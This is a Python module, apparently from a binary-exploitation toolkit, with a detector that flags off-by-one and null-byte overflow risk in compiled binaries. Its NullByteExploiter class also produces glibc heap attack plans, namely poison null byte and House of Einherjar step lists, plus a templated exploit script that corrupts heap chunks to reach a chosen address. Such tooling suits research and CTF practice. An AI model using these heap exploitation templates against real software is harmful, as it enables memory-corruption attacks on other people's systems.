"""
Off-by-one and null-byte overflow detection.

Detects:
- Off-by-one write vulnerabilities (heap/stack)
- Null-byte overflow (poison null byte)
- Fence-post errors in loops
- strlen/strcpy boundary issues
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple

from supwngo.core.binary import Binary
from supwngo.fuzzing.crash_triage import CrashCase
from supwngo.utils.libc import parse_libc_version
from supwngo.vulns.detector import (
    ExploitPrimitive,
    Vulnerability,
    VulnerabilityDetector,
    VulnType,
    VulnSeverity,
)
from supwngo.vulns._disasm import DisassemblyUnavailable, objdump_intel
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class OffByOneType(Enum):
    """Types of off-by-one vulnerabilities."""
    NULL_BYTE = auto()       # Writes single null byte past boundary
    ONE_BYTE = auto()        # Writes one byte past boundary
    HEAP_METADATA = auto()   # Can corrupt heap chunk size
    STACK_CANARY = auto()    # Can overwrite canary's null byte
    POINTER_LOW = auto()     # Can modify pointer's low byte


@dataclass
class OffByOneVuln(Vulnerability):
    """Off-by-one vulnerability details."""
    obo_type: OffByOneType = OffByOneType.NULL_BYTE
    function_name: str = ""
    buffer_size: int = 0
    overflow_offset: int = 0
    can_corrupt_size: bool = False  # For heap chunks
    can_bypass_canary: bool = False  # For stack
    exploitation_notes: str = ""
    name: str = ""


class OffByOneDetector(VulnerabilityDetector):
    """
    Detect off-by-one vulnerabilities.

    Techniques:
    1. Static pattern matching for common mistakes
    2. Loop bound analysis
    3. String function usage analysis
    4. Heap chunk size field proximity
    """

    # Functions that commonly cause off-by-one
    RISKY_STRING_FUNCS = {
        "strcpy": "No bounds checking",
        "strncpy": "May not null-terminate",
        "strncat": "Null terminator overflow",
        "gets": "No bounds checking",
        "fgets": "Off-by-one in size parameter",
        "read": "No null termination",
        "recv": "No null termination",
        "sprintf": "No bounds checking",
        "snprintf": "May not null-terminate",
        "scanf": "No bounds checking on %s",
        "memcpy": "Boundary calculation errors",
    }

    # Patterns indicating loop boundary issues
    LOOP_PATTERNS = [
        # for (i = 0; i <= len; i++)  -- should be i < len
        b"cmp.*<=",
        b"jle",
        b"jbe",
    ]

    def __init__(self, binary: Binary):
        """
        Initialize detector.

        Args:
            binary: Target binary
        """
        self.binary = binary
        self.vulnerabilities: List[OffByOneVuln] = []

    # Length-terminating copies whose mere presence is a cheap, precision-first
    # off-by-one signal (classic one-byte / missing-NUL sites). Plain strcpy is
    # deliberately excluded: it is a generic stack-overflow signal that fires on
    # non-off-by-one targets and would pollute precision.
    OFF_BY_ONE_CALL_SIGNALS = ("snprintf", "strncpy", "strncat")

    def detect(
        self,
        crash: Optional[CrashCase] = None,
    ) -> List[OffByOneVuln]:
        """Detect off-by-one via a cheap body-level signal (Sprint-B2, bounded).

        Precision-first: emit OFF_BY_ONE only when the binary actually *calls* a
        length-terminating copy (snprintf/strncpy/strncat), the classic site of a
        one-byte / missing-NUL error. It never fires on the symbol-identical
        loop-bound shapes whose positive and control differ only by a single
        ``cmp`` operand order (see plan G2e); that discrimination is a scoped
        follow-on. Maps exclusively to VulnType.OFF_BY_ONE, so it cannot perturb
        stack_bof / heap_overflow precision. Does not crash on odd input, but
        propagates :class:`DisassemblyUnavailable` when objdump could not run so
        ``detect_all`` records an honest ``DetectorFailure``.
        """
        self.vulnerabilities = []
        try:
            self._scan_terminating_copy_calls()
        except DisassemblyUnavailable:
            # The binary was never disassembled -> surface as a DetectorFailure
            # (honest "could not analyze"), not a silent zero-finding pass.
            raise
        except Exception as e:  # noqa: BLE001 -- contract: don't crash on odd input
            logger.debug(f"Off-by-one scan failed: {e}")
        return self.vulnerabilities

    def get_exploit_primitive(
        self,
        vuln: Vulnerability,
    ) -> Optional[ExploitPrimitive]:
        """An off-by-one gives a single-byte (often NUL) write just past a buffer
        boundary: a size-1, non-value-controllable write primitive."""
        return ExploitPrimitive(
            primitive_type="write",
            target_controllable=False,
            value_controllable=False,
            write_size=1,
        )

    def _scan_terminating_copy_calls(self) -> None:
        """Emit one OFF_BY_ONE finding if the binary calls a length-terminating
        copy (see ``detect`` for the rationale)."""
        rows = objdump_intel(self.binary)
        if not rows:
            return
        for r in rows:
            if not r.startswith("call"):
                continue
            for fn in self.OFF_BY_ONE_CALL_SIGNALS:
                if f"<{fn}@plt>" in r:
                    self.vulnerabilities.append(
                        OffByOneVuln(
                            vuln_type=VulnType.OFF_BY_ONE,
                            severity=VulnSeverity.MEDIUM,
                            detection_method="static",
                            confidence=0.6,
                            description=(
                                f"calls {fn}() -- a length-terminating copy prone "
                                "to a one-byte / missing-NUL off-by-one"
                            ),
                            obo_type=OffByOneType.NULL_BYTE,
                            function_name=fn,
                            name=f"off-by-one-{fn}",
                        )
                    )
                    # One finding per binary suffices for identification.
                    return

    def analyze_function(
        self,
        func_addr: int,
        func_name: str = "",
    ) -> List[OffByOneVuln]:
        """
        Analyze specific function for off-by-one bugs.

        Args:
            func_addr: Function address
            func_name: Function name

        Returns:
            List of vulnerabilities in function
        """
        vulns = []

        try:
            # Use capstone for disassembly
            import capstone

            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary

            # Read function bytes (assume max 0x500 bytes)
            func_data = elf.read(func_addr, 0x500)

            md = capstone.Cs(
                capstone.CS_ARCH_X86,
                capstone.CS_MODE_64 if self.binary.bits == 64 else capstone.CS_MODE_32
            )
            md.detail = True

            # Track register values and memory accesses
            buffer_sizes: Dict[str, int] = {}
            loop_bounds: List[Tuple[int, str]] = []

            for insn in md.disasm(func_data, func_addr):
                # Track lea instructions (often buffer setup)
                if insn.mnemonic == 'lea':
                    # Could extract stack offset to estimate buffer size
                    pass

                # Track cmp with <= patterns
                if insn.mnemonic == 'cmp':
                    pass

                # Track jbe/jle after cmp (potential fence-post)
                if insn.mnemonic in ('jbe', 'jle'):
                    loop_bounds.append((insn.address, str(insn)))

                # Track calls to risky functions
                if insn.mnemonic == 'call':
                    for risky_func in self.RISKY_STRING_FUNCS:
                        # This is simplified - real impl would resolve call target
                        pass

        except ImportError:
            logger.debug("capstone not available for detailed analysis")
        except Exception as e:
            logger.debug(f"Function analysis failed: {e}")

        return vulns


def analyze_for_null_byte_poison(
    chunk_sizes: List[int],
    overflow_offset: int,
) -> Dict[str, Any]:
    """
    Analyze heap layout for null byte poison attack.

    Args:
        chunk_sizes: List of chunk sizes in allocation order
        overflow_offset: Offset where overflow occurs in first chunk

    Returns:
        Attack analysis
    """
    result = {
        "feasible": False,
        "reason": "",
        "steps": [],
        "target_chunk_idx": -1,
    }

    if not chunk_sizes:
        result["reason"] = "No chunk sizes provided"
        return result

    # Calculate actual chunk sizes (add heap metadata)
    METADATA_SIZE = 0x10  # prev_size + size fields
    MIN_CHUNK = 0x20

    actual_sizes = []
    for size in chunk_sizes:
        # Round up to alignment
        actual = max((size + METADATA_SIZE + 0xf) & ~0xf, MIN_CHUNK)
        actual_sizes.append(actual)

    # Calculate chunk positions
    positions = [0]
    for size in actual_sizes[:-1]:
        positions.append(positions[-1] + size)

    # Check if overflow can reach next chunk's size field
    first_chunk_data_start = positions[0] + METADATA_SIZE
    overflow_target = first_chunk_data_start + overflow_offset

    for i, pos in enumerate(positions[1:], 1):
        size_field_pos = pos + 0x8  # prev_size + size offset

        if overflow_target == size_field_pos:
            result["feasible"] = True
            result["target_chunk_idx"] = i
            result["steps"] = [
                f"1. Allocate {len(chunk_sizes)} chunks with sizes: {chunk_sizes}",
                f"2. Overflow from chunk 0 at offset {overflow_offset}",
                f"3. Null byte corrupts chunk {i}'s size field LSB",
                f"4. Chunk {i}'s size becomes 0x{actual_sizes[i] & 0xffffff00:x}",
                f"5. Free chunk {i} to create overlapping region",
                "6. Use overlapping chunks for arbitrary write",
            ]
            break

    if not result["feasible"]:
        result["reason"] = "Overflow doesn't reach any chunk size field"

    return result


class NullByteExploiter:
    """
    Generate exploits for null byte overflow bugs.

    Implements:
    - Poison null byte on heap
    - House of Einherjar variant
    - Chunk size corruption
    """

    def __init__(self, libc_version: Optional[str] = None):
        """
        Initialize exploiter.

        Args:
            libc_version: Target glibc version, or ``None`` if unknown. An
                unknown version is never fabricated: version-gated feasibility
                verdicts read "unknown" rather than a definite true/false.
        """
        self.version = libc_version
        parsed = parse_libc_version(libc_version)
        # ``None`` == unknown minor; branches/verdicts surface the unknown.
        self.minor: Optional[int] = parsed[1] if parsed is not None else None

    def poison_null_byte_exploit(
        self,
        vuln_chunk_size: int,
        target_addr: int,
    ) -> Dict[str, Any]:
        """
        Generate poison null byte exploit strategy.

        Args:
            vuln_chunk_size: Size of chunk with overflow
            target_addr: Target address for write primitive

        Returns:
            Exploit strategy
        """
        result = {
            "technique": "poison_null_byte",
            "glibc_version": self.version,
            "feasible": True,
            "steps": [],
            "chunk_layout": [],
            "code": "",
        }

        # Check glibc version constraints
        if self.minor is None:
            result["note"] = (
                "glibc version unknown; 2.29+ adds checks (harder but possible) "
                "-- verify against the target libc"
            )
        elif self.minor >= 29:
            result["note"] = "glibc 2.29+ has additional checks, harder but possible"

        # Calculate optimal chunk sizes
        # Chunk B needs size like 0x100 so null byte makes it 0x00
        b_size = 0x100 - 0x10  # Request size to get 0x100 chunk

        result["chunk_layout"] = [
            {"name": "A", "size": vuln_chunk_size, "purpose": "Overflow source"},
            {"name": "B", "size": b_size, "purpose": "Size corruption target"},
            {"name": "C", "size": 0x80, "purpose": "Prevent consolidation"},
        ]

        result["steps"] = [
            "1. Allocate chunk A (overflow source)",
            "2. Allocate chunk B with size 0x100 (0xf0 request)",
            "3. Allocate chunk C (guard chunk)",
            "4. Free chunk B (goes to unsorted bin if tcache full)",
            "5. Trigger overflow: null byte corrupts B's prev_inuse bit",
            "6. malloc(0x100 - 0x10) gets overlapping chunk",
            "7. Use overlap to corrupt FD pointer",
            f"8. Poison with target: 0x{target_addr:x}",
            "9. Two more allocations to get target as chunk",
        ]

        result["code"] = f'''
# Poison null byte exploit
def exploit():
    # Setup
    A = alloc({vuln_chunk_size})
    B = alloc(0xf0)  # 0x100 chunk
    C = alloc(0x80)  # Guard

    # Free B to put in bins
    free(B)

    # Trigger off-by-one null byte overflow from A
    # This corrupts B's prev_inuse bit
    edit(A, b'A' * {vuln_chunk_size} + b'\\x00')

    # Now allocate overlapping chunk
    D = alloc(0xf0)  # Overlaps with freed B region

    # D and B overlap - corrupt B's fd to target
    edit(D, p64(0x{target_addr:x}))

    # Two allocations to reach target
    alloc(0xf0)  # Returns B
    target_chunk = alloc(0xf0)  # Returns target!

    return target_chunk
'''

        return result

    def house_of_einherjar(
        self,
        controlled_chunk_size: int,
        target_addr: int,
    ) -> Dict[str, Any]:
        """
        Generate House of Einherjar exploit.

        Uses null byte overflow to fake consolidation.

        Args:
            controlled_chunk_size: Size of controlled chunk
            target_addr: Target address

        Returns:
            Exploit strategy
        """
        result = {
            "technique": "house_of_einherjar",
            "glibc_version": self.version,
            # Unknown version -> unknown feasibility (None), never a fabricated
            # true/false. Harder on newer glibc (2.29+).
            "feasible": (None if self.minor is None else self.minor < 29),
            "steps": [],
        }

        if self.minor is None:
            result["note"] = (
                "glibc version unknown; feasibility undetermined "
                "(harder on glibc 2.29+)"
            )
        elif self.minor >= 29:
            result["note"] = "Requires additional heap leak for unlink checks bypass"

        result["steps"] = [
            "1. Allocate chunk A",
            "2. Allocate chunk B (target for null byte)",
            "3. Create fake chunk in A pointing to target area",
            "4. Set fake prev_size in B to reach fake chunk",
            "5. Null byte overflow clears B's prev_inuse",
            "6. free(B) triggers backward consolidation",
            "7. Malloc returns chunk overlapping target",
        ]

        return result

    def summary(self) -> str:
        """Get technique summary."""
        return f"""
Null Byte Overflow Exploitation
===============================
glibc version: {self.version}

Techniques:
- Poison Null Byte: Corrupt chunk size via null overflow
- House of Einherjar: Fake backward consolidation

Applicability:
- glibc < 2.29: Full exploitation possible
- glibc 2.29+: Need heap leak for unlink bypass
- glibc 2.32+: Also need safe-linking bypass
"""
